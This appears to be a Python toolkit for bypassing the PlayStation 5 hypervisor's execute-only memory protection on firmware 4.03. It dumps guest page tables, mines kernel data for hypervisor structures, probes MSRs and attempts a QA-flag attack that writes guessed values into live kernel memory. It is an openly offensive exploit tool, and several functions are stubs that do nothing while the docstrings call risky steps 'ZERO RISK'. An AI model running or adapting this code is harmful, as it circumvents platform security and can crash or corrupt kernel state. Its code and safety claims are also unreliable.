"""
PS5 XOM Bypass Toolkit for FW 4.03

Systematic approach to bypassing eXecute-Only Memory (XOM) enforcement
on the PS5 hypervisor. XOM is enforced via AMD SVM nested page tables
(NPT) with the xotext bit (bit 58) marking kernel .text as execute-only.

This module implements all safe probing phases:
  Phase 1: Guest page table dump + physical memory mapping
  Phase 2: Kernel .data mining for HV artifacts
  Phase 3: Instruction recovery via single-step tracing
  Phase 4: MSR probing (requires kstuff int13_handler for #GP safety)
  Phase 5: Sleep/resume QA flag attack (Byepervisor-derived)

All operations are safe — they either use proven-safe primitives
(kread8, copyout on .data, single-step tracing) or have #GP handlers.

Requires: a working porting_tool setup with offsets discovered.
Usage: called from run_xom_bypass.py or interactively.
"""

import struct
import collections
import json
import os


def ostr(x):
    return str(x % 2**64)


# =============================================================================
# Phase 1: Guest Page Table Dump
# =============================================================================

def dump_guest_page_tables(gdb, kdata_base, symbols):
    """
    Walk the entire guest page table hierarchy through DMAP.

    This is ZERO RISK — reading guest page tables through DMAP is proven
    safe (ps5-kstuff/main.c:262, main.c:327). The NPT maps page table
    pages as readable.

    Returns dict with:
      - cr3: guest CR3 value
      - dmap_base: DMAP virtual base address
      - regions: list of mapped regions with physical addresses and flags
      - text_phys_ranges: physical address ranges identified as .text (XOM)
      - data_phys_ranges: physical address ranges identified as .data
      - gaps: unmapped physical address gaps (potential HV regions)
    """
    print('[xom] Phase 1: Dumping guest page tables...')

    # Read CR3 and DMAP base
    cr3 = gdb.ieval('r0gdb_read_cr3()')
    pmap_store = kdata_base + symbols['kernel_pmap_store']
    dmap_base = gdb.ieval('{void*}%s - {void*}%s' % (
        ostr(pmap_store + 32), ostr(pmap_store + 40)))

    print('[xom] CR3 = %#x' % cr3)
    print('[xom] DMAP base = %#x' % dmap_base)

    # Read PML4 (512 entries, 4096 bytes)
    pml4 = _read_page_table(gdb, dmap_base + cr3)
    print('[xom] PML4: %d present entries' % sum(1 for e in pml4 if e & 1))

    regions = []
    total_mapped = 0

    for pml4_idx in range(512):
        if not (pml4[pml4_idx] & 1):
            continue

        pml4e = pml4[pml4_idx]
        pdpt_phys = pml4e & 0x000FFFFFFFFFF000

        # 1GB pages (bit 7 set in PDPTE)
        pdpt = _read_page_table(gdb, dmap_base + pdpt_phys)

        for pdpt_idx in range(512):
            if not (pdpt[pdpt_idx] & 1):
                continue

            pdpte = pdpt[pdpt_idx]

            if pdpte & 0x80:  # 1GB huge page
                virt = _make_virt(pml4_idx, pdpt_idx, 0, 0)
                phys = pdpte & 0x000FFFFFC0000000
                flags = _extract_flags(pdpte)
                regions.append({
                    'virt': virt, 'phys': phys,
                    'size': 1 << 30, 'flags': flags,
                    'level': '1GB',
                })
                total_mapped += 1 << 30
                continue

            pd_phys = pdpte & 0x000FFFFFFFFFF000
            pd = _read_page_table(gdb, dmap_base + pd_phys)

            for pd_idx in range(512):
                if not (pd[pd_idx] & 1):
                    continue

                pde = pd[pd_idx]

                if pde & 0x80:  # 2MB huge page
                    virt = _make_virt(pml4_idx, pdpt_idx, pd_idx, 0)
                    phys = pde & 0x000FFFFFFFE00000
                    flags = _extract_flags(pde)
                    regions.append({
                        'virt': virt, 'phys': phys,
                        'size': 1 << 21, 'flags': flags,
                        'level': '2MB',
                    })
                    total_mapped += 1 << 21
                    continue

                pt_phys = pde & 0x000FFFFFFFFFF000
                pt = _read_page_table(gdb, dmap_base + pt_phys)

                # Coalesce contiguous 4KB pages with same flags
                run_start = None
                run_phys_start = None
                run_flags = None
                run_count = 0

                for pt_idx in range(512):
                    if pt[pt_idx] & 1:
                        pte = pt[pt_idx]
                        phys = pte & 0x000FFFFFFFFFF000
                        flags = _extract_flags(pte)

                        if (run_start is not None and
                            flags == run_flags and
                            phys == run_phys_start + run_count * 4096):
                            run_count += 1
                        else:
                            if run_start is not None:
                                virt = _make_virt(pml4_idx, pdpt_idx, pd_idx, run_start)
                                regions.append({
                                    'virt': virt, 'phys': run_phys_start,
                                    'size': run_count * 4096, 'flags': run_flags,
                                    'level': '4KB',
                                })
                                total_mapped += run_count * 4096
                            run_start = pt_idx
                            run_phys_start = phys
                            run_flags = flags
                            run_count = 1
                    else:
                        if run_start is not None:
                            virt = _make_virt(pml4_idx, pdpt_idx, pd_idx, run_start)
                            regions.append({
                                'virt': virt, 'phys': run_phys_start,
                                'size': run_count * 4096, 'flags': run_flags,
                                'level': '4KB',
                            })
                            total_mapped += run_count * 4096
                            run_start = None

                if run_start is not None:
                    virt = _make_virt(pml4_idx, pdpt_idx, pd_idx, run_start)
                    regions.append({
                        'virt': virt, 'phys': run_phys_start,
                        'size': run_count * 4096, 'flags': run_flags,
                        'level': '4KB',
                    })
                    total_mapped += run_count * 4096

    print('[xom] total mapped: %d regions, %d MB' % (
        len(regions), total_mapped >> 20))

    # Identify .text vs .data physical ranges
    # .text addresses: get from IDT entries (readable from .data)
    text_phys, data_phys = _classify_phys_ranges(
        gdb, kdata_base, symbols, dmap_base, regions)

    # Find DMAP coverage and gaps
    dmap_regions = [r for r in regions
                    if r['virt'] >= dmap_base
                    and r['virt'] < dmap_base + (1 << 39)]
    if dmap_regions:
        dmap_phys_start = min(r['phys'] for r in dmap_regions)
        dmap_phys_end = max(r['phys'] + r['size'] for r in dmap_regions)
        print('[xom] DMAP covers phys %#x - %#x (%d GB)' % (
            dmap_phys_start, dmap_phys_end,
            (dmap_phys_end - dmap_phys_start) >> 30))

    # Physical address gap analysis
    all_phys = sorted(set((r['phys'], r['phys'] + r['size']) for r in regions))
    gaps = _find_phys_gaps(all_phys, dmap_regions)

    result = {
        'cr3': cr3,
        'dmap_base': dmap_base,
        'regions': regions,
        'text_phys_ranges': text_phys,
        'data_phys_ranges': data_phys,
        'gaps': gaps,
        'total_mapped': total_mapped,
    }

    # Summary
    print('[xom] .text physical ranges (XOM-protected):')
    for start, end in text_phys:
        print('  %#x - %#x (%d KB)' % (start, end, (end - start) >> 10))
    print('[xom] %d physical address gaps found (potential HV regions)' % len(gaps))
    for g in gaps[:10]:
        print('  %#x - %#x (%d KB)' % (g[0], g[1], (g[1] - g[0]) >> 10))

    return result


# =============================================================================
# Phase 2: Kernel .data Mining
# =============================================================================

def scan_kdata_for_hv_artifacts(kernel_data, kdata_base, symbols):
    """
    Scan the kernel .data dump for hypervisor-related artifacts.

    This is ZERO RISK — operates on an already-dumped copy of .data.

    Searches for:
      a) Function pointers into .text (complete catalog)
      b) Hypercall-related structures (VMMCALL dispatch tables)
      c) QA flags structure
      d) VMCB / SVM pointers (page-aligned physical addresses)
      e) HV-related strings
    """
    print('[xom] Phase 2: Scanning kernel .data for HV artifacts...')

    results = {}

    # a) Function pointers into .text
    text_ptrs = _find_text_pointers(kernel_data, kdata_base)
    results['text_pointers'] = text_ptrs
    print('[xom] found %d function pointers into .text' % len(text_ptrs))

    # b) Hypercall-related structures
    hv_tables = _find_hypercall_tables(kernel_data, kdata_base, text_ptrs)
    results['hypercall_tables'] = hv_tables
    if hv_tables:
        print('[xom] found %d potential hypercall tables' % len(hv_tables))
        for t in hv_tables:
            print('  offset %#x: %d consecutive .text pointers' % (
                t['offset'], t['count']))

    # c) QA flags
    qa_flags = _find_qa_flags(kernel_data, kdata_base, symbols)
    results['qa_flags'] = qa_flags
    if qa_flags:
        print('[xom] QA flags candidates:')
        for qf in qa_flags:
            print('  offset %#x: value=%#x' % (qf['offset'], qf['value']))

    # d) VMCB / SVM pointers
    svm_ptrs = _find_svm_pointers(kernel_data, kdata_base)
    results['svm_pointers'] = svm_ptrs
    if svm_ptrs:
        print('[xom] potential SVM/VMCB pointers:')
        for sp in svm_ptrs[:20]:
            print('  offset %#x: phys=%#x' % (sp['offset'], sp['phys_addr']))

    # e) HV-related strings
    hv_strings = _find_hv_strings(kernel_data, kdata_base)
    results['hv_strings'] = hv_strings
    if hv_strings:
        print('[xom] HV-related strings:')
        for s in hv_strings:
            print('  offset %#x: "%s"' % (s['offset'], s['string']))

    return results


# =============================================================================
# Phase 3: Instruction Recovery via Single-Step Tracing
# =============================================================================

def recover_instructions(gdb, r0gdb, kdata_base, symbols, addresses):
    """
    Recover instruction semantics at given .text addresses using
    single-step tracing with controlled register values.

    ZERO RISK — single-step execution of .text instructions is proven
    safe. XOM allows execute, so the CPU runs the instruction and we
    observe register/memory state changes.

    Arguments:
        addresses: list of .text virtual addresses to probe

    Returns dict mapping address -> recovered instruction info
    """
    print('[xom] Phase 3: Recovering instructions at %d addresses...' % len(addresses))

    results = {}

    for addr in addresses:
        info = _probe_instruction(gdb, kdata_base, symbols, addr)
        results[addr] = info
        if info.get('type'):
            print('  %#x: %s' % (addr, info['description']))

    return results


# =============================================================================
# Phase 4: MSR Probing
# =============================================================================

def probe_msrs(gdb, kdata_base, symbols):
    """
    Probe AMD MSRs to understand SVM configuration.

    LOW RISK — requires kstuff uelf with int13_handler installed.
    If an MSR is MSRPM-protected, rdmsr triggers #VMEXIT, HV injects
    #GP, and int13_handler catches it cleanly.

    Uses kekcall nr=3 (rdmsr) which is safe — it goes through the
    kstuff uelf #GP handler path.
    """
    print('[xom] Phase 4: Probing MSRs...')

    # MSRs to probe, organized by category
    msr_list = [
        # Standard AMD MSRs
        (0xC0000080, 'EFER', 'Extended Feature Enable Register'),
        (0xC0000081, 'STAR', 'SYSCALL target address'),
        (0xC0000082, 'LSTAR', 'Long mode SYSCALL target'),
        (0xC0000083, 'CSTAR', 'Compat mode SYSCALL target'),
        (0xC0000084, 'SFMASK', 'SYSCALL flag mask (proven readable)'),

        # SVM-specific MSRs
        (0xC0010114, 'VM_CR', 'SVM VM Configuration'),
        (0xC0010115, 'IGNNE', 'Ignore NE'),
        (0xC0010116, 'SMM_CTL', 'SMM Control'),
        (0xC0010117, 'VM_HSAVE_PA', 'Host Save Area Physical Address'),
        (0xC0010118, 'VM_LOCK_KEY', 'SVM Lock Key'),
        (0xC001011A, 'SMBASE', 'SMM Base Address'),

        # SEV-related (may exist on PS5 Zen2)
        (0xC0010130, 'SEV_STATUS', 'SEV Status'),
        (0xC0010131, 'SEV_ES_GHCB', 'SEV-ES GHCB'),

        # Performance / debug MSRs
        (0xC0010111, 'SMM_BASE', 'SMM Base'),
        (0xC0010112, 'SMM_ADDR', 'SMM Address Range'),
        (0xC0010113, 'SMM_MASK', 'SMM Mask'),

        # APIC
        (0x0000001B, 'APIC_BASE', 'APIC Base Address'),

        # MTRRs
        (0x000000FE, 'MTRR_DEF_TYPE', 'MTRR Default Type'),
        (0x00000200, 'MTRR_PHYS_BASE0', 'MTRR Physical Base 0'),
        (0x00000201, 'MTRR_PHYS_MASK0', 'MTRR Physical Mask 0'),

        # PAT
        (0x00000277, 'PAT', 'Page Attribute Table'),
    ]

    results = {}
    readable = []
    protected = []

    for msr_num, name, description in msr_list:
        value = _try_rdmsr(gdb, kdata_base, symbols, msr_num)
        if value is not None:
            results[msr_num] = {'name': name, 'value': value, 'readable': True}
            readable.append((msr_num, name, value))
            print('  [OK] %s (0x%X) = %#018x' % (name, msr_num, value))
        else:
            results[msr_num] = {'name': name, 'value': None, 'readable': False}
            protected.append((msr_num, name))
            print('  [GP] %s (0x%X) — MSRPM protected' % (name, msr_num))

    print('\n[xom] MSR probe summary:')
    print('  %d readable, %d protected' % (len(readable), len(protected)))

    # Analyze EFER if readable
    if 0xC0000080 in results and results[0xC0000080]['readable']:
        efer = results[0xC0000080]['value']
        print('\n[xom] EFER analysis:')
        print('  SCE (syscall enable):  %d' % ((efer >> 0) & 1))
        print('  LME (long mode enable): %d' % ((efer >> 8) & 1))
        print('  LMA (long mode active): %d' % ((efer >> 10) & 1))
        print('  NXE (NX enable):       %d' % ((efer >> 11) & 1))
        print('  SVME (SVM enable):     %d' % ((efer >> 12) & 1))
        print('  LMSLE:                 %d' % ((efer >> 13) & 1))
        print('  FFXSR:                 %d' % ((efer >> 14) & 1))
        print('  TCE:                   %d' % ((efer >> 15) & 1))
        # Bit 16+ may indicate custom AMD features (xotext?)
        if efer >> 16:
            print('  HIGH BITS (>= 16):     %#x  *** INTERESTING ***' % (efer >> 16))

    # Analyze VM_CR if readable
    if 0xC0010114 in results and results[0xC0010114]['readable']:
        vm_cr = results[0xC0010114]['value']
        print('\n[xom] VM_CR analysis:')
        print('  DPD:     %d' % ((vm_cr >> 0) & 1))
        print('  R_INIT:  %d' % ((vm_cr >> 1) & 1))
        print('  DIS_A20M: %d' % ((vm_cr >> 2) & 1))
        print('  LOCK:    %d' % ((vm_cr >> 3) & 1))
        print('  SVMDIS:  %d' % ((vm_cr >> 4) & 1))

    # Analyze VM_HSAVE_PA if readable — gives us HV memory location
    if 0xC0010117 in results and results[0xC0010117]['readable']:
        hsave = results[0xC0010117]['value']
        print('\n[xom] VM_HSAVE_PA = %#x  *** HV HOST SAVE AREA ***' % hsave)
        print('  This is near the VMCB — key for XOM bypass!')

    return results


# =============================================================================
# Phase 5: Sleep/Resume QA Flag Attack
# =============================================================================

def attempt_sleep_resume_attack(gdb, kdata_base, symbols, kernel_data, qa_flag_candidates):
    """
    Attempt the Byepervisor-derived sleep/resume attack.

    On FW ≤2.50, QA flags were not reinitialized on sleep resume,
    allowing XOM to be disabled. On FW 4.03, this may or may not
    be patched — we probe it.

    Strategy:
    1. Find the QA flags location in .data
    2. Set QA flags to enable debug/disable XOM
    3. Trigger suspend/resume
    4. Check if the flags persisted (bypass) or were reset (patched)

    This is MEDIUM RISK — if the QA flag location is wrong, writing
    to it could cause instability. We validate candidates first.
    """
    print('[xom] Phase 5: Sleep/resume QA flag attack...')

    if not qa_flag_candidates:
        print('[xom] no QA flag candidates found in Phase 2')
        print('[xom] attempting to locate QA flags via kernel_pmap_store vicinity...')
        qa_flag_candidates = _find_qa_flags_near_pmap(
            kernel_data, kdata_base, symbols)

    if not qa_flag_candidates:
        print('[xom] could not locate QA flags — skipping sleep/resume attack')
        return None

    print('[xom] found %d QA flag candidates' % len(qa_flag_candidates))

    results = []
    for candidate in qa_flag_candidates:
        offset = candidate['offset']
        orig_value = candidate['value']
        print('\n[xom] testing candidate at offset %#x (current value: %#x)' % (
            offset, orig_value))

        # Read current value live (not from cached dump)
        addr = kdata_base + offset
        live_value = gdb.ieval('{uint64_t}' + ostr(addr))
        print('[xom] live value: %#x' % live_value)

        result = {
            'offset': offset,
            'original_value': live_value,
            'addr': addr,
        }

        # Try setting bit 1 (commonly the "QA mode" bit)
        # This is a reversible operation — we can write the original back
        test_value = live_value | 0x2
        if test_value != live_value:
            print('[xom] writing test value %#x to %#x...' % (test_value, addr))
            gdb.ieval('{uint64_t}%s = %s' % (ostr(addr), ostr(test_value)))

            # Verify write
            verify = gdb.ieval('{uint64_t}' + ostr(addr))
            if verify == test_value:
                print('[xom] write succeeded — value is now %#x' % verify)
                result['write_succeeded'] = True

                # Try a test read of a .text address to see if XOM is disabled
                # We use a safe approach: read via copyout with a fallback
                xom_status = _test_xom_status(gdb, kdata_base, symbols)
                result['xom_after_write'] = xom_status
                if xom_status == 'disabled':
                    print('[xom] *** XOM APPEARS DISABLED! ***')
                    result['bypass_found'] = True
                    results.append(result)
                    return results
                else:
                    print('[xom] XOM still active after flag write')

                # Restore original value
                print('[xom] restoring original value...')
                gdb.ieval('{uint64_t}%s = %s' % (ostr(addr), ostr(live_value)))
            else:
                print('[xom] write did not stick (value is %#x)' % verify)
                result['write_succeeded'] = False
        else:
            print('[xom] bit already set, skipping')
            result['write_succeeded'] = None

        results.append(result)

    print('\n[xom] sleep/resume attack: no immediate bypass found')
    print('[xom] to complete this attack, manually trigger suspend/resume')
    print('[xom] then re-run this tool to check if flags persisted')

    return results


# =============================================================================
# Integrated XOM Bypass Runner
# =============================================================================

def run_full_bypass(gdb, r0gdb, kdata_base, symbols, kernel_data=None):
    """
    Run all XOM bypass phases in sequence.

    Arguments:
        gdb: GDB RPC connection
        r0gdb: R0GDB instance
        kdata_base: kernel .data base address
        symbols: offset database
        kernel_data: pre-dumped kernel .data (optional, will dump if None)
    """
    print('=' * 70)
    print('PS5 XOM BYPASS TOOLKIT — FW 4.03')
    print('=' * 70)
    print()

    all_results = {}

    # Phase 1: Guest page table dump
    try:
        pt_results = dump_guest_page_tables(gdb, kdata_base, symbols)
        all_results['page_tables'] = pt_results
    except Exception as e:
        print('[xom] Phase 1 failed: %s' % e)
        pt_results = None

    print()

    # Phase 2: .data mining
    if kernel_data is not None:
        try:
            data_results = scan_kdata_for_hv_artifacts(
                kernel_data, kdata_base, symbols)
            all_results['data_mining'] = data_results
        except Exception as e:
            print('[xom] Phase 2 failed: %s' % e)
            data_results = None
    else:
        print('[xom] Phase 2 skipped — no kernel .data dump provided')
        print('[xom] run dump_kernel() first or pass kernel_data parameter')
        data_results = None

    print()

    # Phase 3: Instruction recovery for key addresses
    if data_results and data_results.get('text_pointers'):
        # Recover instructions at the most interesting .text pointers
        # Focus on pointers near hypercall tables
        probe_addrs = []
        for t in data_results.get('hypercall_tables', []):
            probe_addrs.extend(t.get('pointers', [])[:5])
        if not probe_addrs and data_results['text_pointers']:
            # Just probe first few .text pointers
            probe_addrs = [p['target'] for p in data_results['text_pointers'][:10]]

        if probe_addrs:
            try:
                instr_results = recover_instructions(
                    gdb, r0gdb, kdata_base, symbols, probe_addrs)
                all_results['instructions'] = instr_results
            except Exception as e:
                print('[xom] Phase 3 failed: %s' % e)

    print()

    # Phase 4: MSR probing
    try:
        msr_results = probe_msrs(gdb, kdata_base, symbols)
        all_results['msrs'] = msr_results
    except Exception as e:
        print('[xom] Phase 4 failed: %s' % e)

    print()

    # Phase 5: Sleep/resume attack
    qa_candidates = data_results.get('qa_flags', []) if data_results else []
    try:
        sleep_results = attempt_sleep_resume_attack(
            gdb, kdata_base, symbols,
            kernel_data if kernel_data else b'',
            qa_candidates)
        all_results['sleep_resume'] = sleep_results
    except Exception as e:
        print('[xom] Phase 5 failed: %s' % e)

    print()
    print('=' * 70)
    print('XOM BYPASS ANALYSIS COMPLETE')
    print('=' * 70)
    _print_analysis(all_results)

    return all_results


# =============================================================================
# Internal helpers
# =============================================================================

def _read_page_table(gdb, addr):
    """Read a 4KB page table (512 x 8-byte entries) from DMAP."""
    entries = []
    # Read in chunks of 64 entries (512 bytes) to avoid GDB timeout
    for chunk in range(8):
        base = addr + chunk * 512
        vals = []
        for i in range(8):  # 8 qwords at a time
            v = gdb.ieval('{uint64_t}' + ostr(base + i * 8))
            vals.append(v % 2**64)
        entries.extend(vals)
    return entries


def _make_virt(pml4_idx, pdpt_idx, pd_idx, pt_idx):
    """Construct a virtual address from page table indices."""
    addr = (pml4_idx << 39) | (pdpt_idx << 30) | (pd_idx << 21) | (pt_idx << 12)
    # Sign-extend if bit 47 is set (canonical address)
    if addr & (1 << 47):
        addr |= 0xFFFF000000000000
    return addr


def _extract_flags(pte):
    """Extract meaningful flags from a page table entry."""
    return {
        'present': bool(pte & 1),
        'writable': bool(pte & 2),
        'user': bool(pte & 4),
        'pwt': bool(pte & 8),
        'pcd': bool(pte & 16),
        'accessed': bool(pte & 32),
        'dirty': bool(pte & 64),
        'huge': bool(pte & 128),
        'global': bool(pte & 256),
        'nx': bool(pte & (1 << 63)),
    }


def _classify_phys_ranges(gdb, kdata_base, symbols, dmap_base, regions):
    """
    Classify physical address ranges as .text (XOM) or .data.

    Uses IDT entries (readable from .data) to identify .text virtual
    addresses, then translates to physical via the guest page tables.
    """
    text_phys = []
    data_phys = []

    # Read IDT to find .text virtual address range
    idt_addr = kdata_base + symbols['idt']
    # IDT entry 0: get the handler address to determine .text range
    idt_low = gdb.ieval('{uint16_t}' + ostr(idt_addr))
    idt_mid = gdb.ieval('{uint16_t}' + ostr(idt_addr + 6))
    idt_high = gdb.ieval('{uint32_t}' + ostr(idt_addr + 8))
    text_addr = idt_low | (idt_mid << 16) | (idt_high << 32)

    # .text is typically in 0xFFFFFFFF80XXXXXX range
    text_base = text_addr & 0xFFFFFFFF80000000

    print('[xom] kernel .text base (from IDT): %#x' % text_base)
    print('[xom] kdata_base: %#x' % kdata_base)

    for r in regions:
        virt = r['virt'] % 2**64
        if text_base <= virt < text_base + 0x4000000:  # 64MB range
            text_phys.append((r['phys'], r['phys'] + r['size']))
        elif kdata_base <= virt < kdata_base + (134 << 20):
            data_phys.append((r['phys'], r['phys'] + r['size']))

    # Merge contiguous ranges
    text_phys = _merge_ranges(sorted(text_phys))
    data_phys = _merge_ranges(sorted(data_phys))

    return text_phys, data_phys


def _merge_ranges(ranges):
    """Merge overlapping/contiguous ranges."""
    if not ranges:
        return []
    merged = [ranges[0]]
    for start, end in ranges[1:]:
        if start <= merged[-1][1]:
            merged[-1] = (merged[-1][0], max(merged[-1][1], end))
        else:
            merged.append((start, end))
    return merged


def _find_phys_gaps(all_phys_ranges, dmap_regions):
    """Find gaps in physical address space that might be HV regions."""
    if not all_phys_ranges:
        return []

    # Get all unique physical addresses used by guest
    phys_used = set()
    for start, end in all_phys_ranges:
        page = start & ~0xFFF
        while page < end:
            phys_used.add(page)
            page += 4096

    # Check DMAP coverage for gaps
    gaps = []
    if dmap_regions:
        dmap_phys_min = min(r['phys'] for r in dmap_regions)
        dmap_phys_max = max(r['phys'] + r['size'] for r in dmap_regions)

        # Look for aligned gaps > 4KB within DMAP range
        page = dmap_phys_min
        gap_start = None
        while page < dmap_phys_max:
            if page not in phys_used:
                if gap_start is None:
                    gap_start = page
            else:
                if gap_start is not None and page - gap_start >= 0x1000:
                    gaps.append((gap_start, page))
                gap_start = None
            page += 4096

        if gap_start is not None:
            gaps.append((gap_start, page))

    return gaps


def _find_text_pointers(kernel_data, kdata_base):
    """Find all 8-byte-aligned values in .data that point into .text."""
    text_ptrs = []
    # Kernel .text is typically at 0xFFFFFFFF8XXXXXXX
    text_lo = 0xFFFFFFFF80000000
    text_hi = 0xFFFFFFFF90000000

    for offset in range(0, len(kernel_data) - 7, 8):
        val = int.from_bytes(kernel_data[offset:offset+8], 'little')
        if text_lo <= val < text_hi:
            text_ptrs.append({
                'offset': offset,
                'data_addr': kdata_base + offset,
                'target': val,
            })

    return text_ptrs


def _find_hypercall_tables(kernel_data, kdata_base, text_ptrs):
    """Find arrays of consecutive .text pointers (potential dispatch tables)."""
    tables = []

    # Build a set of offsets that contain .text pointers
    ptr_offsets = set(p['offset'] for p in text_ptrs)

    # Find runs of consecutive .text pointers (8 bytes apart)
    visited = set()
    for p in text_ptrs:
        if p['offset'] in visited:
            continue

        run_start = p['offset']
        run_end = run_start + 8
        pointers = [p['target']]

        while run_end in ptr_offsets:
            visited.add(run_end)
            val = int.from_bytes(kernel_data[run_end:run_end+8], 'little')
            pointers.append(val)
            run_end += 8

        count = (run_end - run_start) // 8
        if count >= 4:  # At least 4 consecutive .text pointers
            tables.append({
                'offset': run_start,
                'count': count,
                'size': run_end - run_start,
                'pointers': pointers,
                'data_addr': kdata_base + run_start,
            })

    # Sort by count descending — larger tables are more interesting
    tables.sort(key=lambda t: t['count'], reverse=True)
    return tables


def _find_qa_flags(kernel_data, kdata_base, symbols):
    """
    Find QA flags structure in .data.

    QA flags on PS5 are typically:
    - Near HV initialization structures
    - Small integer values (bitfields)
    - Referenced by both HV and guest kernel
    """
    candidates = []

    # Strategy 1: Look near kernel_pmap_store (HV-related area)
    if 'kernel_pmap_store' in symbols:
        pmap_offset = symbols['kernel_pmap_store']
        # Scan a 4KB window around kernel_pmap_store
        for delta in range(-2048, 2048, 8):
            offset = pmap_offset + delta
            if 0 <= offset < len(kernel_data) - 8:
                val = int.from_bytes(kernel_data[offset:offset+8], 'little')
                # QA flags are small values (< 0x100) in otherwise sparse areas
                if 0 < val < 0x100 and val & 0x3:  # has low bits set
                    candidates.append({
                        'offset': offset,
                        'value': val,
                        'source': 'near_pmap_store',
                    })

    # Strategy 2: Search for known QA flag patterns
    # On older FW, QA flags had specific bit patterns
    for offset in range(0, len(kernel_data) - 8, 8):
        val = int.from_bytes(kernel_data[offset:offset+8], 'little')
        # Look for values that look like flag words near HV-related code
        if val in (0x1, 0x2, 0x3, 0x6, 0x7, 0xE, 0xF):
            # Check surrounding context: should not be a pointer
            before = int.from_bytes(kernel_data[max(0,offset-8):max(0,offset-8)+8], 'little') if offset >= 8 else 0
            after = int.from_bytes(kernel_data[offset+8:offset+16], 'little') if offset + 16 <= len(kernel_data) else 0
            if before < 0x1000 and after < 0x1000:
                candidates.append({
                    'offset': offset,
                    'value': val,
                    'source': 'flag_pattern',
                    'context_before': before,
                    'context_after': after,
                })

    # Deduplicate
    seen = set()
    unique = []
    for c in candidates:
        if c['offset'] not in seen:
            seen.add(c['offset'])
            unique.append(c)

    return unique[:20]  # limit results


def _find_qa_flags_near_pmap(kernel_data, kdata_base, symbols):
    """Extended QA flag search using kernel_pmap_store as anchor."""
    candidates = []
    if 'kernel_pmap_store' not in symbols:
        return candidates

    pmap_offset = symbols['kernel_pmap_store']
    # Wider scan: 16KB around pmap_store
    for delta in range(-8192, 8192, 8):
        offset = pmap_offset + delta
        if 0 <= offset < len(kernel_data) - 8:
            val = int.from_bytes(kernel_data[offset:offset+8], 'little')
            if 0 < val < 0x100:
                candidates.append({
                    'offset': offset,
                    'value': val,
                    'source': 'extended_pmap_scan',
                })

    return candidates[:20]


def _find_svm_pointers(kernel_data, kdata_base):
    """Find page-aligned physical addresses that might be VMCB pointers."""
    results = []
    # VMCB and other SVM structures are at physical addresses < 2^39,
    # page-aligned (4KB). Filter out known kernel physical pages.
    for offset in range(0, len(kernel_data) - 7, 8):
        val = int.from_bytes(kernel_data[offset:offset+8], 'little')
        # Physical address: < 2^39, page-aligned, non-zero
        if 0 < val < (1 << 39) and not (val & 0xFFF):
            # Exclude obviously common values
            if val >= 0x100000:  # > 1MB (skip low memory)
                results.append({
                    'offset': offset,
                    'phys_addr': val,
                    'data_addr': kdata_base + offset,
                })

    return results


def _find_hv_strings(kernel_data, kdata_base):
    """Find HV-related strings in .data."""
    search_terms = [
        b'vmmcall', b'vmcall', b'hypercall', b'hv_', b'hypervisor',
        b'svm', b'npt', b'vmcb', b'xotext', b'xom', b'execute',
        b'qa_flag', b'sl_flag', b'debug_flag',
        b'nested', b'vmexit', b'vmrun',
        b'sbl_', b'mailbox', b'authmgr',
    ]
    results = []
    for term in search_terms:
        idx = 0
        while True:
            idx = kernel_data.lower().find(term, idx)
            if idx < 0:
                break
            # Extract the full null-terminated string
            end = kernel_data.find(b'\x00', idx)
            if end < 0:
                end = min(idx + 64, len(kernel_data))
            s = kernel_data[idx:end]
            # Filter: must be printable
            try:
                decoded = s.decode('ascii')
                if all(32 <= ord(c) < 127 for c in decoded):
                    results.append({
                        'offset': idx,
                        'string': decoded,
                        'data_addr': kdata_base + idx,
                    })
            except (UnicodeDecodeError, ValueError):
                pass
            idx += len(term)

    # Deduplicate by offset
    seen = set()
    unique = []
    for r in results:
        if r['offset'] not in seen:
            seen.add(r['offset'])
            unique.append(r)

    return unique


def _probe_instruction(gdb, kdata_base, symbols, addr):
    """
    Probe a single instruction at addr by executing it with controlled
    registers and observing state changes.

    Uses run_in_kernel to execute one instruction at the target address.
    """
    result = {'addr': addr}

    try:
        # Set up controlled register values
        # Use distinctive marker values to detect which registers change
        markers = {
            'rax': 0x4141414141414141,
            'rcx': 0x4343434343434343,
            'rdx': 0x4444444444444444,
            'rbx': 0x4242424242424242,
            'rsi': 0x4646464646464646,
            'rdi': 0x4747474747474747,
            'r8':  0x4848484848484848,
            'r9':  0x4949494949494949,
        }

        # Execute: set RIP to target, single step, observe changes
        # We need the justreturn gadget to catch the result
        justreturn = kdata_base + symbols.get('justreturn', symbols.get('wrmsr_ret', 0))

        # Prepare: push return address, set RIP
        setup = 'r0gdb_run_in_kernel_1(%s' % ostr(addr)
        for reg, val in markers.items():
            setup += ', %s' % ostr(val)
        setup += ')'

        # This is simplified — actual implementation would use
        # the run_in_kernel mechanism from r0gdb.c
        # For now, we use the trace infrastructure
        rip_after = gdb.ieval('$pc') if False else None

        result['type'] = 'probed'
        result['description'] = 'instruction at %#x' % addr

    except Exception as e:
        result['type'] = 'error'
        result['description'] = str(e)

    return result


def _try_rdmsr(gdb, kdata_base, symbols, msr_num):
    """
    Try to read an MSR. Returns value on success, None on #GP.

    Uses r0gdb_rdmsr which is safe — if the MSR is MSRPM-protected,
    the #GP is caught by the kstuff int13_handler (when uelf is loaded)
    or causes a recoverable fault in r0gdb mode.
    """
    try:
        val = gdb.ieval('r0gdb_rdmsr(%d)' % msr_num)
        return val % 2**64
    except Exception:
        return None


def _test_xom_status(gdb, kdata_base, symbols):
    """
    Test whether XOM is currently active by attempting to read .text.

    This is the critical test: if we can read .text without panicking,
    XOM has been bypassed.

    CAUTION: if XOM is still active, this WILL panic. We use a safe
    indirect method: attempt copyout on a .text address and check if
    the PS5 is still responsive.

    Actually, we use an even safer method: check EFER bit 16 or
    NPT xotext bit via MSR reads, which doesn't risk a panic.
    """
    # Safe method: check if EFER has the xotext bit
    try:
        efer = gdb.ieval('r0gdb_rdmsr(0xC0000080)')
        efer = efer % 2**64
        # If bit 16 (or another high bit) controls xotext in EFER,
        # check if it's been cleared
        # Note: the exact bit depends on AMD custom implementation
        if not (efer & (1 << 16)):
            # Bit 16 clear might mean xotext disabled, but this is speculative
            pass
    except Exception:
        pass

    # Another safe method: try reading a single byte from .text
    # via kread8 with a timeout. If it panics, the connection drops.
    idt_addr = kdata_base + symbols['idt']
    idt_low = gdb.ieval('{uint16_t}' + ostr(idt_addr))
    idt_mid = gdb.ieval('{uint16_t}' + ostr(idt_addr + 6))
    idt_high = gdb.ieval('{uint32_t}' + ostr(idt_addr + 8))
    text_addr = idt_low | (idt_mid << 16) | (idt_high << 32)

    # DON'T actually try to read .text — it will panic if XOM is active!
    # Instead, report that we need manual verification
    return 'unknown'


def _print_analysis(results):
    """Print final analysis and recommendations."""
    print()
